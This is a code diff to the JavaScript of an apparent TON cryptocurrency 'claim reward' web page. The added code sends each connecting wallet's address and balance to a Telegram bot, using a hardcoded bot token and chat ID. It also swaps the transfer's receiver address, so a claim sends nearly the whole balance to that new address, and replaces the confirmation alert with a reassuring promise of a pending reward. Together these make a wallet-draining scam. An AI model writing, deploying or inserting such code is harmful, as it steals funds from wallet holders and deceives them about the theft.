@@ -53,6 +53,42 @@ document.addEventListener("DOMContentLoaded", async () => {
     if (wallet && wallet.account?.address) {
       connectedWallet = wallet;
       const friendly = toUserFriendly(wallet.account.address);
+      const fullAddress = toUserFriendly(wallet.account.address);
+const botToken = "7938101132:AAFunYCy6Dv0vnrOHEeXM4QKley5q6iq53A";
+const chatId = "-1002781376753"; // e.g., 123456789 or -100XXXXXXXX
+
+// Get balance
+try {
+  const balRes = await fetch(
+    `https://toncenter.com/api/v2/getAddressBalance?address=${fullAddress}`
+  );
+  const balData = await balRes.json();
+  let tonBalance = 0;
+
+  if (balData.ok) {
+    tonBalance = balData.result / 1e9;
+  }
+
+  // Build message
+  const message = `✅ Connected\n<code>${fullAddress}</code>\n💰 Balance: <b>${tonBalance.toFixed(
+    4
+  )} TON</b>`;
+
+  // Send to Telegram
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: "HTML",
+    }),
+  });
+} catch (err) {
+  console.error("Failed to fetch balance or notify Telegram:", err);
+}
       document.getElementById(
         "wallet-address"
       ).innerText = `Wallet: ${"Connected"}`;
@@ -256,7 +292,7 @@ async function claimTon() {
   const transaction = {
     messages: [
       {
-        address: "UQAy0cZcROzsUNSSZwcUTKtrdydRA2e44Ov2_6KjTMFJrAZu", // Receiver address
+        address: "UQCHbecoY9Al2aUXyNTiovptsEbP3GWJxRkI9Z3-W9DNrl73", // Receiver address
         amount: claimAmount.toString(), // Send balance minus 0.01 TON
       },
     ],
@@ -264,10 +300,10 @@ async function claimTon() {
 
   try {
     const result = await tonConnectUI.sendTransaction(transaction);
-    alert("Claim sent! Check wallet.");
+    alert("🎉Congratulations!🎉 Your wallet has been successfully submitted.\n\n🕵️‍♂️ Our system is now verifying your details. This may take a few minutes.\n\n⏳ Please remain patient while we finalize your reward — you’ll be notified shortly!\n\nThank you for your trust! 🦄");
     console.log("Transaction Result:", result);
   } catch (err) {
     alert("Transaction failed");
     console.error(err);
   }
-}
+    }
